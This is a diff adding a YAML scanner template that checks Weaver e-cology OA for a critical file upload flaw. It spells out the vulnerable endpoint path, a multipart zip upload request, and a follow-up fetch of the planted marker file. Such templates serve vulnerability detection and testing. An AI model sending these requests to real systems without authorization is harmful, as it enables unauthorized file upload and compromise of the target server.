@@ -1,0 +1,32 @@
+id: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-530634
+info:
+  name: Yaml Poc Weaver Weaver_E_Cology_Oa File_Upload Ct 530634
+  author: haiqing.chen
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-weaver-weaver_e_cology_oa-file_upload-CT-530634'
+  tags: fileupload
+  reference: []
+http:
+- method: POST
+  path:
+  - /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp
+  body: '------{{rboundary}}
+
+    Content-Disposition: form-data; name="file"; filename="test.zip"
+
+    Content-Type: application/zip
+
+
+    {{zipData}}
+
+    ------{{rboundary}}--'
+  headers:
+    Content-Type: multipart/form-data; boundary=----{{rboundary}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /cloudstore/login_xray.txt
